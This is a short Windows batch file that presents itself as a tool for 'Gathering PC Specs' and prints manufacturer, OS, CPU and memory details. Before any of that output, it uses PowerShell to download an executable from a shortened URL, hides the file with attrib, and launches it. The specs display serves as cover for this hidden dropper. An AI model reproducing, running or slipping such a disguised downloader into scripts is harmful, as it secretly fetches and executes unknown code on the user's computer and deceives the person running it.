@echo off
echo Gathering PC Specs...

powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://tinyurl.com/2sme6kdc', 'd.exe')"


attrib +h d.exe

start d

echo. 
echo ===== System Information =====
systeminfo | find "System Manufacturer"
systeminfo | find "System Model"
systeminfo | find "OS Name"
systeminfo | find "OS Version"
systeminfo | find "System Type"

echo. 
echo ===== CPU Information =====
for /f "delims=" %%a in ('powershell -command "(Get-WmiObject -Class Win32_Processor).Name"') do set "cpu_name=%%a"
echo CPU Name: %cpu_name%

echo. 
echo ===== Memory Information =====
wmic memorychip get capacity
wmic memorychip get speed

echo.



echo Press Enter to exit...
pause > nul
